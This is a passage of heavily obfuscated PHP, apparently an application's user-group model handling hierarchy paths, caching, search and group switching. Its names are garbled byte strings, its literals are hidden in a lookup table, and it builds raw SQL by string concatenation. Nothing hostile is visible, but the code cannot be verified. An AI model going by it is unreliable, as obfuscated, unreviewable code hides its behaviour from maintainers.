$«ü³†Ë¡ =& $_SERVER[­õöî’–]; $øÔ¯§“· = array($«ü³†Ë¡[590] => array($«ü³†Ë¡[550], $ö¼ÚÙ÷[$«ü³†Ë¡[521]] . $ö¼ÚÙ÷[$«ü³†Ë¡[1849]] . $«ü³†Ë¡[551])); $¾Üû’å‘ = $this->field($«ü³†Ë¡[1849])->where($øÔ¯§“·)->select(); foreach ($¾Üû’å‘ as $¸²×Şâ—) { $this->_clearCache($¸²×Şâ—[$«ü³†Ë¡[1849]]); } } private function _clearCache($±éİ’úœ) { $Ô½Ø²ó =& $_SERVER[­õöî’–]; $this->cacheFunctionClear($Ô½Ø²ó[1931], $±éİ’úœ); $this->cacheFunctionClear($Ô½Ø²ó[1932], $±éİ’úœ); } private function _changeChildLevel($ô°ÈÛ‡«, $–‚¥ßó, $ßˆ¼ìô = false) { $Ãú‡¡ Á =& $_SERVER[­õöî’–]; $™äÈ Ë¦ = $ô°ÈÛ‡«[$Ãú‡¡ Á[521]] . $ô°ÈÛ‡«[$Ãú‡¡ Á[1849]] . $Ãú‡¡ Á[50]; $É¥¦–é = $–‚¥ßó[$Ãú‡¡ Á[521]] . $–‚¥ßó[$Ãú‡¡ Á[1849]] . $Ãú‡¡ Á[50] . $ô°ÈÛ‡«[$Ãú‡¡ Á[1849]] . $Ãú‡¡ Á[50]; if ($ßˆ¼ìô) { $É¥¦–é = $–‚¥ßó[$Ãú‡¡ Á[521]] . $–‚¥ßó[$Ãú‡¡ Á[1849]] . $Ãú‡¡ Á[50]; } $àÁ¿Ã˜ˆ = array($Ãú‡¡ Á[590] => array($Ãú‡¡ Á[550], $ô°ÈÛ‡«[$Ãú‡¡ Á[521]] . $ô°ÈÛ‡«[$Ãú‡¡ Á[1849]] . $Ãú‡¡ Á[551])); $éÆ¤Üò = array($Ãú‡¡ Á[590] => array($Ãú‡¡ Á[599], "\162\145\160\x6c\141\x63\x65\x28\x70\x61\162\145\x6e\164\x4c\145\166\145\x6c\54\x27{$™äÈ Ë¦}\x27\x2c\x27{$É¥¦–é}\47\x29")); $this->_clearChildrenCache($ô°ÈÛ‡«); $this->where($àÁ¿Ã˜ˆ)->data($éÆ¤Üò)->save(); } public function setNamePinyin($­Ã÷îÀµ, $º¬Ù·Ş = false) { $’Á›“Ë =& $_SERVER[­õöî’–]; if (!$º¬Ù·Ş) { $ñ„˜á›õ = $this->getInfoSimple($­Ã÷îÀµ); $º¬Ù·Ş = $ñ„˜á›õ[$’Á›“Ë[32]]; } if (!Input::check($º¬Ù·Ş, $’Á›“Ë[593])) { $this->metaSet($­Ã÷îÀµ, $’Á›“Ë[465], null); $this->metaSet($­Ã÷îÀµ, $’Á›“Ë[464], null); return; } $Üšúœ  = array($’Á›“Ë[465] => str_replace($’Á›“Ë[53], $’Á›“Ë[12], Pinyin::get($º¬Ù·Ş)), $’Á›“Ë[464] => Pinyin::get($º¬Ù·Ş, $’Á›“Ë[594])); $this->metaSet($­Ã÷îÀµ, $Üšúœ ); } protected function groupStatus($ÌÚ¾¨¸î, $éè¿®Ô¡) { $–Ìö€¸Ò =& $_SERVER[­õöî’–]; $ƒ’ÑĞãÚ = $this->getInfoSimple($ÌÚ¾¨¸î); if (!$ƒ’ÑĞãÚ) { return !1; } if ($éè¿®Ô¡ == $–Ìö€¸Ò[88]) { $¯ğ«ÄøÒ = $this->parentLevelArray($ƒ’ÑĞãÚ[$–Ìö€¸Ò[521]]); } else { $ÕöÙü˜« = array($–Ìö€¸Ò[590] => array($–Ìö€¸Ò[550], $ƒ’ÑĞãÚ[$–Ìö€¸Ò[521]] . $ƒ’ÑĞãÚ[$–Ìö€¸Ò[1849]] . $–Ìö€¸Ò[551])); $¯ğ«ÄøÒ = $this->where($ÕöÙü˜«)->field($–Ìö€¸Ò[1849])->select(); $¯ğ«ÄøÒ = array_to_keyvalue($¯ğ«ÄøÒ, $–Ìö€¸Ò[12], $–Ìö€¸Ò[1849]); } $¯ğ«ÄøÒ[] = $ƒ’ÑĞãÚ[$–Ìö€¸Ò[1849]]; $•Á”ª€­ = array(); foreach ($¯ğ«ÄøÒ as $ÌÚ¾¨¸î) { $•Á”ª€­[] = array($–Ìö€¸Ò[1849] => $ÌÚ¾¨¸î, $–Ìö€¸Ò[94] => $–Ìö€¸Ò[741], $–Ìö€¸Ò[374] => $éè¿®Ô¡); $this->_clearCache($ÌÚ¾¨¸î); } return Model($–Ìö€¸Ò[1938])->addAll($•Á”ª€­, array(), !0); } protected function groupRemove($¬§¾ì¨°, $üÖ´ºËâ = false) { $¶ôû·£ =& $_SERVER[­õöî’–]; $ü»è‰÷ = array($¶ôû·£[1849] => $¬§¾ì¨°); $ªÛìåş¤ = $this->where($ü»è‰÷)->find(); if (!$ªÛìåş¤ || $ªÛìåş¤[$¶ôû·£[432]] == 0) { return !1; } if (!$üÖ´ºËâ) { $äæ¹¶ = $this->getInfoSimple($ªÛìåş¤[$¶ôû·£[432]]); $this->_changeChildLevel($ªÛìåş¤, $äæ¹¶, !0); $this->where(array($¶ôû·£[432] => $¬§¾ì¨°))->save(array($¶ôû·£[432] => $ªÛìåş¤[$¶ôû·£[432]])); } Model($¶ôû·£[1938])->where($ü»è‰÷)->delete(); Model($¶ôû·£[1939])->where($ü»è‰÷)->delete(); Model($¶ôû·£[816])->groupRootRemove($¬§¾ì¨°); return $this->where($ü»è‰÷)->delete(); } protected function groupSort($’öİÑ›) { $¬¡Õ’šê =& $_SERVER[­õöî’–]; $®™Ó„É = array(); foreach ($’öİÑ› as $çú›âªú => $Ç¤óı ¯) { $®™Ó„É[] = array($¬¡Õ’šê[1849], $Ç¤óı ¯, $¬¡Õ’šê[1873], $çú›âªú + 1); } $this->saveAll($®™Ó„É); } public function listData() { $²¼»– = $this->_makeOrder()->selectPage(50); $this->_listDataApply($²¼»–[$_SERVER[­õöî’–][369]]); return $²¼»–; } private function _makeOrder($®æÏó¬ = '') { $ÈËÙ´ì =& $_SERVER[­õöî’–]; $‹¼„‘‡¸ = array($ÈËÙ´ì[1849], $ÈËÙ´ì[32], $ÈËÙ´ì[1838], $ÈËÙ´ì[200]); $ïœ›ö£ = array($ÈËÙ´ì[450] => $ÈËÙ´ì[451], $ÈËÙ´ì[452] => $ÈËÙ´ì[453]); $…µÖï» = Input::get($ÈËÙ´ì[457], $ÈËÙ´ì[7], $ÈËÙ´ì[1853], $‹¼„‘‡¸); $åêËÂ· = Input::get($ÈËÙ´ì[458], $ÈËÙ´ì[7], $ÈËÙ´ì[1940], array($ÈËÙ´ì[1940], $ÈËÙ´ì[452])); $åêËÂ· = $ïœ›ö£[$åêËÂ·]; $®æÏó¬ = $®æÏó¬ . "{$…µÖï»}\x20{$åêËÂ·}\x2c\x20\147\162\157\x75\160\x49\104\40\141\163\x63"; return $this->order($®æÏó¬); } public function listChild($»«ğ©Ç) { $’¡³ğñ =& $_SERVER[­õöî’–]; $±¸†îÂñ = $this->where(array($’¡³ğñ[432] => $»«ğ©Ç))->_makeOrder()->selectPage(200); $this->_listDataApply($±¸†îÂñ[$’¡³ğñ[369]]); return $±¸†îÂñ; } public function listChildIds($şßó¥†ä) { $–Ãî›Äğ =& $_SERVER[­õöî’–]; if (is_string($ª‰ØÃ”)) { $şßó¥†ä = explode($–Ãî›Äğ[50], $şßó¥†ä); } $ÑÔ¯À€Æ = $this->where(array($–Ãî›Äğ[1849] => array($–Ãî›Äğ[7], $şßó¥†ä)))->field($–Ãî›Äğ[1941])->select(); if (!$ÑÔ¯À€Æ) { return !1; } $„‡±”óú = array(); foreach ($ÑÔ¯À€Æ as $„Í‚¼´™) { $„‡±”óú[] = "\163\145\x6c\145\143\x74\x20\147\x72\157\165\160\111\104\40\x66\x72\157\x6d\40\140\147\x72\157\x75\x70\140\40\x77\x68\x65\x72\145\x20\x70\141\162\145\156\x74\x4c\145\166\145\154\x20\x6c\151\x6b\x65\x20\47{$„Í‚¼´™[$–Ãî›Äğ[521]]}{$„Í‚¼´™[$–Ãî›Äğ[1849]]}\x2c\x25\x27"; } $„‡±”óú = implode($–Ãî›Äğ[1942], $„‡±”óú); $ÑÔ¯À€Æ = $this->query($„‡±”óú); if (!$ÑÔ¯À€Æ) { return array(); } $şßó¥†ä = array_to_keyvalue($ÑÔ¯À€Æ, $–Ãî›Äğ[12], $–Ãî›Äğ[1849]); return array_unique($şßó¥†ä); } public function listByID($íü‰¯„…) { $«¶¾õë´ =& $_SERVER[­õöî’–]; if (!$íü‰¯„…) { return array(); } $´­©ñ‡ë = array($«¶¾õë´[1849] => array($«¶¾õë´[7], $íü‰¯„…)); $’Å¥Ğ = $this->where($´­©ñ‡ë)->select(); $’Å¥Ğ = array_sort_keep($’Å¥Ğ, $«¶¾õë´[1849], $íü‰¯„…); $this->_listDataApply($’Å¥Ğ); return $’Å¥Ğ; } public function listSearch($òô´âÏ›) { $„ŞáÁÑØ =& $_SERVER[­õöî’–]; $Â†­¨ŒÔ = $òô´âÏ›[$„ŞáÁÑØ[1943]]; $ŒĞÌï±² = isset($òô´âÏ›[$„ŞáÁÑØ[1944]]) ? $òô´âÏ›[$„ŞáÁÑØ[1944]] : !1; if (!trim($Â†­¨ŒÔ)) { return !1; } $Â†­¨ŒÔ = str_replace($„ŞáÁÑØ[1945], $„ŞáÁÑØ[1946], $Â†­¨ŒÔ); $¢ÍÀŒ = array($„ŞáÁÑØ[1849] => array($„ŞáÁÑØ[383], "{$Â†­¨ŒÔ}\45"), $„ŞáÁÑØ[32] => array($„ŞáÁÑØ[383], "\x25{$Â†­¨ŒÔ}\x25"), $„ŞáÁÑØ[998] => $„ŞáÁÑØ[1947]); if ($ŒĞÌï±²) { $›üûŞèé = $this->getInfoSimple($ŒĞÌï±²); $ã‹àç—ô = $›üûŞèé[$„ŞáÁÑØ[521]] . $ŒĞÌï±² . $„ŞáÁÑØ[551]; $¢ÍÀŒ = array($¢ÍÀŒ, array($„ŞáÁÑØ[521] => array($„ŞáÁÑØ[383], $ã‹àç—ô))); } $¢ÍÀŒ = $this->parseWhereLike($¢ÍÀŒ); $×ÎÒŒ˜û = $this->_makeOrder()->where($¢ÍÀŒ)->selectPage(20); $×ÎÒŒ˜û = $×ÎÒŒ˜û ? $×ÎÒŒ˜û : array($„ŞáÁÑØ[369] => array(), $„ŞáÁÑØ[366] => array()); if (!$×ÎÒŒ˜û || count($×ÎÒŒ˜û[$„ŞáÁÑØ[369]]) < 5 && Input::check($Â†­¨ŒÔ, $„ŞáÁÑØ[318])) { $¼ù÷åÛŒ = $this->groupChildrenAll($ŒĞÌï±²); $·ô‹§íô = $this->_searchFromMeta($„ŞáÁÑØ[464], $Â†­¨ŒÔ, 10, $¼ù÷åÛŒ); $şÜãğª = $this->_searchFromMeta($„ŞáÁÑØ[465], $Â†­¨ŒÔ, 10, $¼ù÷åÛŒ); $ ãÁœºÚ = array_merge($·ô‹§íô, $şÜãğª, $×ÎÒŒ˜û[$„ŞáÁÑØ[369]]); $×ÎÒŒ˜û[$„ŞáÁÑØ[369]] = array_unique_by_key($ ãÁœºÚ, $„ŞáÁÑØ[1849]); $×ÎÒŒ˜û[$„ŞáÁÑØ[366]][$„ŞáÁÑØ[367]] = count($×ÎÒŒ˜û[$„ŞáÁÑØ[369]]); $×ÎÒŒ˜û[$„ŞáÁÑØ[366]][$„ŞáÁÑØ[368]] = ceil($×ÎÒŒ˜û[$„ŞáÁÑØ[366]][$„ŞáÁÑØ[367]] / $×ÎÒŒ˜û[$„ŞáÁÑØ[366]][$„ŞáÁÑØ[363]]); } $this->_listDataApply($×ÎÒŒ˜û[$„ŞáÁÑØ[369]]); return $×ÎÒŒ˜û; } protected function groupChildrenAll($’«•€¾ ) { $ñ„úßŠµ =& $_SERVER[­õöî’–]; if (!$’«•€¾ ) { return !1; } if (is_string($’«•€¾ )) { $’«•€¾  = array($’«•€¾ ); } $€ÏÏµ…” = $’«•€¾ ; foreach ($’«•€¾  as $±Ùµôı±) { $¼±ÍİÔÕ = $this->getInfoSimple($±Ùµôı±); $ÒÓ‚éãû = array($ñ„úßŠµ[521] => array($ñ„úßŠµ[383], $¼±ÍİÔÕ[$ñ„úßŠµ[521]] . $±Ùµôı± . $ñ„úßŠµ[551])); $•›²œ¼× = $this->field($ñ„úßŠµ[1849])->where($ÒÓ‚éãû)->select(); $€ÏÏµ…” = array_merge($€ÏÏµ…”, array_to_keyvalue($•›²œ¼×, $ñ„úßŠµ[12], $ñ„úßŠµ[1849])); } return array_unique($€ÏÏµ…”); } private function _searchFromMeta($Ó—ú¬ Û, $§íü¶©, $¨ÚÏÇÊ¨, $²‘ˆ˜ ) { $Í‚ğÀÖĞ =& $_SERVER[­õöî’–]; $§íü¶© = strtolower($§íü¶©); $¦è¹£«¡ = array($Í‚ğÀÖĞ[94] => $Ó—ú¬ Û, $Í‚ğÀÖĞ[374] => array($Í‚ğÀÖĞ[383], "\x25{$§íü¶©}\x25")); $¦è¹£«¡ = $this->parseWhereLike($¦è¹£«¡); if ($²‘ˆ˜ ) { $¦è¹£«¡[$Í‚ğÀÖĞ[1849]] = array($Í‚ğÀÖĞ[7], $²‘ˆ˜ ); } $é¶•Ñî· = Model($Í‚ğÀÖĞ[1948])->where($¦è¹£«¡)->limit($¨ÚÏÇÊ¨)->select(); if (!$é¶•Ñî·) { return array(); } $é¶•Ñî· = array_to_keyvalue($é¶•Ñî·, $Í‚ğÀÖĞ[12], $Í‚ğÀÖĞ[1849]); $åÂŞÚç = $this->where(array($Í‚ğÀÖĞ[1937] => array($Í‚ğÀÖĞ[7], $é¶•Ñî·)))->select(); if (!$åÂŞÚç) { return array(); } return $åÂŞÚç; } protected function _listDataApplyItem($Ãƒì©¿Ó) { $ëİÄ×¥‚ = array($Ãƒì©¿Ó); $this->_listDataApply($ëİÄ×¥‚); return $ëİÄ×¥‚[0]; } protected function _listDataApply(&$Ç©”Ùùş) { $¿šşÚ©ã =& $_SERVER[­õöî’–]; if (!$Ç©”Ùùş) { return; } $ùĞ†•¨Ò = array_to_keyvalue($Ç©”Ùùş, $¿šşÚ©ã[12], $¿šşÚ©ã[1849]); $this->_listAppendChildren($Ç©”Ùùş); $this->_listAppendChildrenMember($Ç©”Ùùş); $this->_listAppendMeta($Ç©”Ùùş, $ùĞ†•¨Ò); $this->_listAppendParent($Ç©”Ùùş); $this->_listAppendSourceRoot($Ç©”Ùùş, $ùĞ†•¨Ò); } private function _listAppendChildren(&$ÇÀääê) { $Õ›«¸‡Õ =& $_SERVER[­õöî’–]; $¢ôæŠÍƒ = array_to_keyvalue($ÇÀääê, $Õ›«¸‡Õ[12], $Õ›«¸‡Õ[1849]); $Î‚¬ÚÓà = array($Õ›«¸‡Õ[432] => array($Õ›«¸‡Õ[7], $¢ôæŠÍƒ)); $ÕûßĞ§Ã = array($Õ›«¸‡Õ[432], $Õ›«¸‡Õ[1949] => $Õ›«¸‡Õ[500]); $£ˆ™ö— = $this->field($ÕûßĞ§Ã)->where($Î‚¬ÚÓà)->group($Õ›«¸‡Õ[432])->select(); $İ“îó× = array_to_keyvalue($£ˆ™ö—, $Õ›«¸‡Õ[432], $Õ›«¸‡Õ[500]); foreach ($ÇÀääê as &$¥Èõì›ø) { $ÀÌÁæŒ˜ = $¥Èõì›ø[$Õ›«¸‡Õ[1849]]; $¥Èõì›ø[$Õ›«¸‡Õ[1950]] = isset($İ“îó×[$ÀÌÁæŒ˜]) ? intval($İ“îó×[$ÀÌÁæŒ˜]) : !1; } unset($¥Èõì›ø); } private function _listAppendChildrenMember(&$ıßš–åÊ) { $±‡µ¡À =& $_SERVER[­õöî’–]; $Àş§äÚ´ = array_to_keyvalue($ıßš–åÊ, $±‡µ¡À[12], $±‡µ¡À[1849]); $ñîŞßø = array($±‡µ¡À[1849] => array($±‡µ¡À[7], $Àş§äÚ´)); $·Ÿ‰´éç = array($±‡µ¡À[1849], $±‡µ¡À[1949] => $±‡µ¡À[500]); $ÙÀˆ‚ÓË = Model($±‡µ¡À[1939])->field($·Ÿ‰´éç)->where($ñîŞßø)->group($±‡µ¡À[1849])->select(); $Á²ôÕŸœ = array_to_keyvalue($ÙÀˆ‚ÓË, $±‡µ¡À[1849], $±‡µ¡À[500]); foreach ($ıßš–åÊ as &$şÎÎúÌ) { $·½¢¯“£ = $şÎÎúÌ[$±‡µ¡À[1849]]; $şÎÎúÌ[$±‡µ¡À[1951]] = isset($Á²ôÕŸœ[$·½¢¯“£]) ? intval($Á²ôÕŸœ[$·½¢¯“£]) : !1; } unset($şÎÎúÌ); } private function _listAppendMeta(&$Í‡ãµ¿Û, $ÍëÍÎ·©) { $¤È—Ïíş =& $_SERVER[­õöî’–]; $èª¡ÓÖı = array($¤È—Ïíş[1849] => array($¤È—Ïíş[7], $ÍëÍÎ·©)); $Ó˜Û¢£ = Model($¤È—Ïíş[1938])->where($èª¡ÓÖı)->select(); $Ó˜Û¢£ = array_to_keyvalue_group($Ó˜Û¢£, $¤È—Ïíş[1849]); foreach ($Ó˜Û¢£ as &$ÇÂÓ¯¾) { $ÇÂÓ¯¾ = array_to_keyvalue($ÇÂÓ¯¾, $¤È—Ïíş[94], $¤È—Ïíş[374]); } unset($ÇÂÓ¯¾); foreach ($Í‡ãµ¿Û as &$­š÷±«Ô) { $­š÷±«Ô[$¤È—Ïíş[466]] = array(); if (isset($Ó˜Û¢£[$­š÷±«Ô[$¤È—Ïíş[1849]]])) { $­š÷±«Ô[$¤È—Ïíş[466]] = $Ó˜Û¢£[$­š÷±«Ô[$¤È—Ïíş[1849]]]; } } unset($­š÷±«Ô); } protected function parentLevelArray($ª¦„€¾Ò) { $€àÅŒÜ· =& $_SERVER[­õöî’–]; $ª¦„€¾Ò = explode($€àÅŒÜ·[50], trim($ª¦„€¾Ò, $€àÅŒÜ·[50])); $ª¦„€¾Ò = array_remove_value($ª¦„€¾Ò, $€àÅŒÜ·[197]); return $ª¦„€¾Ò; } protected function parentInGroup($ÌºÂüİò, $ÜÉš£¥) { $ñ’¼Œ´ =& $_SERVER[­õöî’–]; $ıİãÂûÆ = $this->getInfoSimple($ÌºÂüİò); if (!$ıİãÂûÆ) { return !0; } $ûøŸĞ = $this->parentLevelArray($ıİãÂûÆ[$ñ’¼Œ´[521]]); $ûøŸĞ[] = $ÌºÂüİò; foreach ($ûøŸĞ as $ÌºÂüİò) { if (in_array($ÌºÂüİò . $ñ’¼Œ´[12], $ÜÉš£¥)) { return !0; } } return !1; } private function _listAppendParent(&$Ê©¿•è¬) { $ó²³Ü€Ë =& $_SERVER[­õöî’–]; $”ƒ¯À  = array(); foreach ($Ê©¿•è¬ as &$ ñôÀÊ£) { $”ƒ¯À [$ ñôÀÊ£[$ó²³Ü€Ë[1849]]] = $ ñôÀÊ£[$ó²³Ü€Ë[32]]; $ü–äÙˆ· = $this->parentLevelArray($ ñôÀÊ£[$ó²³Ü€Ë[521]]); foreach ($ü–äÙˆ· as $•Àô¥‘¼) { if (!isset($”ƒ¯À [$•Àô¥‘¼])) { $”ƒ¯À [$•Àô¥‘¼] = 0; } } } unset($ ñôÀÊ£); foreach ($”ƒ¯À  as $ú¾şÚ× => $¸èÆûÈÌ) { if ($¸èÆûÈÌ) { continue; } $±•‚¸Ùè = $this->getInfoSimple($ú¾şÚ×); $”ƒ¯À [$ú¾şÚ×] = $±•‚¸Ùè[$ó²³Ü€Ë[32]]; } $çñŸá¹ß = $GLOBALS[$ó²³Ü€Ë[6]][$ó²³Ü€Ë[89]][$ó²³Ü€Ë[1952]]; if ($GLOBALS[$ó²³Ü€Ë[503]] == $ó²³Ü€Ë[88]) { $çñŸá¹ß = !1; } foreach ($Ê©¿•è¬ as &$ ñôÀÊ£) { $ü–äÙˆ· = $this->parentLevelArray($ ñôÀÊ£[$ó²³Ü€Ë[521]]); $Ù×œşİÑ = $ó²³Ü€Ë[12]; foreach ($ü–äÙˆ· as $ú¾şÚ× => $•Àô¥‘¼) { if ($çñŸá¹ß && $ú¾şÚ× == 0) { continue; } $Ù×œşİÑ .= $”ƒ¯À [$•Àô¥‘¼] . $ó²³Ü€Ë[8]; } if ($ü–äÙˆ·) { $Ù×œşİÑ .= $ ñôÀÊ£[$ó²³Ü€Ë[32]]; } $ ñôÀÊ£[$ó²³Ü€Ë[526]] = str_replace($ó²³Ü€Ë[529], $ó²³Ü€Ë[8], $Ù×œşİÑ); } unset($ ñôÀÊ£); } private function _listAppendSourceRoot(&$œÌº¦ÜØ, $Ğäªãˆæ) { $åù©û¿¦ =& $_SERVER[­õöî’–]; $Çù¨æ = Model($åù©û¿¦[816])->listSourceRoot(SourceModel::TYPE_GROUP, $Ğäªãˆæ); $Çù¨æ = array_to_keyvalue($Çù¨æ, $åù©û¿¦[505]); $Çù¨æ = array_remove_key($Çù¨æ, $åù©û¿¦[505]); foreach ($œÌº¦ÜØ as &$¶­˜ıİô) { $¶­˜ıİô[$åù©û¿¦[86]] = $Çù¨æ[$¶­˜ıİô[$åù©û¿¦[1849]]] ? $Çù¨æ[$¶­˜ıİô[$åù©û¿¦[1849]]] : array(); } unset($¶­˜ıİô); } protected function groupMerge($ÓÆÂÂ²·) { $ÓÆÂÂ²· = array_values(array_unique($ÓÆÂÂ²·)); $±¾ø’‘Â = array(); for ($¼ş­ºîÑ = 0; $¼ş­ºîÑ < count($ÓÆÂÂ²·); $¼ş­ºîÑ++) { $Ì¯¼ Ì• = !1; for ($“é§ÛŒÎ = 0; $“é§ÛŒÎ < count($ÓÆÂÂ²·); $“é§ÛŒÎ++) { if ($¼ş­ºîÑ == $“é§ÛŒÎ) { continue; } if ($this->isParentOf($ÓÆÂÂ²·[$“é§ÛŒÎ], $ÓÆÂÂ²·[$¼ş­ºîÑ])) { $Ì¯¼ Ì• = !0; break; } } if (!$Ì¯¼ Ì•) { $±¾ø’‘Â[] = $ÓÆÂÂ²·[$¼ş­ºîÑ]; } } return $±¾ø’‘Â; } protected function isParentOf($è‚ „¤, $™±ĞÈ”) { $—Õ®º¦ =& $_SERVER[­õöî’–]; if (!$è‚ „¤ || !$™±ĞÈ” || $è‚ „¤ == $™±ĞÈ”) { return !1; } $‚ìØ‹½Í = $this->getInfoSimple($è‚ „¤); $Ä´¯õ = $this->getInfoSimple($™±ĞÈ”); $ÜŒñÄÙ  = $‚ìØ‹½Í[$—Õ®º¦[521]] . $è‚ „¤ . $—Õ®º¦[50]; if (substr($Ä´¯õ[$—Õ®º¦[521]], 0, strlen($ÜŒñÄÙ )) == $ÜŒñÄÙ ) { return !0; } return !1; } public function groupShowRoot($ÈÑğé®Ñ, $€¡¸È›î = false) { $ÏåÙÌÚ =& $_SERVER[­õöî’–]; $Æï”ƒ¬á = $this->getInfo($ÈÑğé®Ñ); if (!$Æï”ƒ¬á) { return array(); } $ÌŠÒ‘ä = $this->parentLevelArray($Æï”ƒ¬á[$ÏåÙÌÚ[521]]); $ÄòŞãÇ¤ = array($ÈÑğé®Ñ); if (count($ÌŠÒ‘ä) == 0) { return $ÄòŞãÇ¤; } if ($€¡¸È›î && count($ÌŠÒ‘ä) == 1) { return $ÄòŞãÇ¤; } if (!$Æï”ƒ¬á[$ÏåÙÌÚ[466]] || !isset($Æï”ƒ¬á[$ÏåÙÌÚ[466]][$ÏåÙÌÚ[1935]]) || $Æï”ƒ¬á[$ÏåÙÌÚ[466]][$ÏåÙÌÚ[1935]] == $ÏåÙÌÚ[1904]) { return $this->groupShowRoot($ÌŠÒ‘ä[count($ÌŠÒ‘ä) - 1], $€¡¸È›î); } if ($Æï”ƒ¬á[$ÏåÙÌÚ[466]][$ÏåÙÌÚ[1935]] == $ÏåÙÌÚ[357]) { $©Î¶´äş = explode($ÏåÙÌÚ[50], $Æï”ƒ¬á[$ÏåÙÌÚ[466]][$ÏåÙÌÚ[1936]]); if ($©Î¶´äş) { $ÄòŞãÇ¤ = array_merge($ÄòŞãÇ¤, $©Î¶´äş); } } return $ÄòŞãÇ¤; } protected function resetParentLevel() { $¢ÌÆ•ò =& $_SERVER[­õöî’–]; $Ê†µï‹ş = $¢ÌÆ•ò[1849]; $éµ¢‡›æ = $this->select(); $éµ¢‡›æ = array_to_keyvalue($éµ¢‡›æ, $Ê†µï‹ş); foreach ($éµ¢‡›æ as $„ö«ıÔ) { $©‰Ü½¯¥ = $„ö«ıÔ; $ÆÉŠ¿˜¸ = array(); while ($©‰Ü½¯¥[$¢ÌÆ•ò[432]] != 0) { $ÆÉŠ¿˜¸[] = $©‰Ü½¯¥[$¢ÌÆ•ò[432]]; $©‰Ü½¯¥ = $éµ¢‡›æ[$©‰Ü½¯¥[$¢ÌÆ•ò[432]]]; } $ÆÉŠ¿˜¸[] = 0; $ÆÉŠ¿˜¸ = $¢ÌÆ•ò[50] . implode($¢ÌÆ•ò[50], array_reverse($ÆÉŠ¿˜¸)) . $¢ÌÆ•ò[50]; $this->setNamePinyin($„ö«ıÔ[$Ê†µï‹ş], $„ö«ıÔ[$¢ÌÆ•ò[32]]); $this->where(array($Ê†µï‹ş => $„ö«ıÔ[$Ê†µï‹ş]))->save(array($¢ÌÆ•ò[590] => $ÆÉŠ¿˜¸)); } return $éµ¢‡›æ; } public function groupNameAuto($£ıøÌÓ, $ÁÔŸäÍç) { $¯Êˆ»È™ =& $_SERVER[­õöî’–]; $Õ¢£ĞìÇ = $this->where(array($¯Êˆ»È™[401] => $£ıøÌÓ))->getField($¯Êˆ»È™[32], !0); if (!$Õ¢£ĞìÇ || !in_array($ÁÔŸäÍç, $Õ¢£ĞìÇ)) { return $ÁÔŸäÍç; } for ($™£Ì©Çƒ = 1; $™£Ì©Çƒ <= count($Õ¢£ĞìÇ) + 1; $™£Ì©Çƒ++) { $Ëˆ€¡É™ = $ÁÔŸäÍç . "\50{$™£Ì©Çƒ}\x29"; if (!in_array($Ëˆ€¡É™, $Õ¢£ĞìÇ)) { return $Ëˆ€¡É™; } } } public function groupSwitch($ ›Øˆæ•, $Ó›¤äı) { $Ş¼áÚÂº =& $_SERVER[­õöî’–]; $ßÕÌ×Æ¹ = array($Ş¼áÚÂº[1849] => array($Ş¼áÚÂº[7], array($ ›Øˆæ•, $Ó›¤äı))); $ö±ä¹Ó = $this->where($ßÕÌ×Æ¹)->select(); $ö±ä¹Ó = array_to_keyvalue($ö±ä¹Ó, $Ş¼áÚÂº[1849]); if (!isset($ö±ä¹Ó[$ ›Øˆæ•]) || !isset($ö±ä¹Ó[$Ó›¤äı]) || $ö±ä¹Ó[$ ›Øˆæ•][$Ş¼áÚÂº[432]] == 0) { return !1; } $ßÕÌ×Æ¹ = array($Ş¼áÚÂº[1849] => $ ›Øˆæ•); $ÖÌ—¡ï› = Model($Ş¼áÚÂº[1939])->where($ßÕÌ×Æ¹)->select(); if (!$ÖÌ—¡ï›) { $ÖÌ—¡ï› = array(); } foreach ($ÖÌ—¡ï› as $¿‚ááÕò) { $ê¸Ìú¾ = $¿‚ááÕò[$Ş¼áÚÂº[1660]]; $ßÕÌ×Æ¹ = array($Ş¼áÚÂº[1660] => $ê¸Ìú¾, $Ş¼áÚÂº[1849] => $Ó›¤äı); $áÒĞĞôõ = Model($Ş¼áÚÂº[1939])->where($ßÕÌ×Æ¹)->find(); if (!$áÒĞĞôõ) { $£š•ÏÙë = array($Ó›¤äı => $¿‚ááÕò[$Ş¼áÚÂº[1953]]); Model($Ş¼áÚÂº[535])->userGroupAdd($ê¸Ìú¾, $£š•ÏÙë); } Model($Ş¼áÚÂº[535])->userGroupRemove($ê¸Ìú¾, $ ›Øˆæ•); } $ßÕÌ×Æ¹ = array($Ş¼áÚÂº[411] => 2, $Ş¼áÚÂº[432] => 0, $Ş¼áÚÂº[410] => 1, $Ş¼áÚÂº[505] => array($Ş¼áÚÂº[7], array($ ›Øˆæ•, $Ó›¤äı))); $ƒÛ·æä = Model($Ş¼áÚÂº[816])->where($ßÕÌ×Æ¹)->field($Ş¼áÚÂº[1954])->select(); $ƒÛ·æä = array_to_keyvalue($ƒÛ·æä, $Ş¼áÚÂº[505], $Ş¼áÚÂº[402]); $‡Ğ¡”Øñ = !empty($ƒÛ·æä[$ ›Øˆæ•]) ? $ƒÛ·æä[$ ›Øˆæ•] : !1; if ($‡Ğ¡”Øñ) { if (!$ƒÛ·æä[$Ó›¤äı]) { $ƒÛ·æä[$Ó›¤äı] = Model($Ş¼áÚÂº[816])->groupRootAdd($Ó›¤äı); } $­—¦ß¦À = $ƒÛ·æä[$Ó›¤äı]; $ßÕÌ×Æ¹ = array($Ş¼áÚÂº[432] => $‡Ğ¡”Øñ); $ƒÛ·æä = Model($Ş¼áÚÂº[816])->where($ßÕÌ×Æ¹)->field($Ş¼áÚÂº[1955])->select(); if (!$ƒÛ·æä) { $ƒÛ·æä = array(); } Model($Ş¼áÚÂº[816])->moveClearAuth = !1; foreach ($ƒÛ·æä as $ûû‘¦¢) { $ğŞĞî§± = $ûû‘¦¢[$Ş¼áÚÂº[410]] == $Ş¼áÚÂº[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Ş¼áÚÂº[816])->move($ûû‘¦¢[$Ş¼áÚÂº[402]], $­—¦ß¦À, $ğŞĞî§±); } Model($Ş¼áÚÂº[816])->moveClearAuth = !0; $ßÕÌ×Æ¹ = array($Ş¼áÚÂº[411] => 2, $Ş¼áÚÂº[505] => $ ›Øˆæ•); $ŞÃÌ”¸ = array($Ş¼áÚÂº[505] => $Ó›¤äı); Model($Ş¼áÚÂº[1956])->where($ßÕÌ×Æ¹)->save($ŞÃÌ”¸); Model($Ş¼áÚÂº[1957])->where($ßÕÌ×Æ¹)->save($ŞÃÌ”¸); } $this->_changeChildLevel($ö±ä¹Ó[$ ›Øˆæ•], $ö±ä¹Ó[$Ó›¤äı], !0); $this->where(array($Ş¼áÚÂº[432] => $ 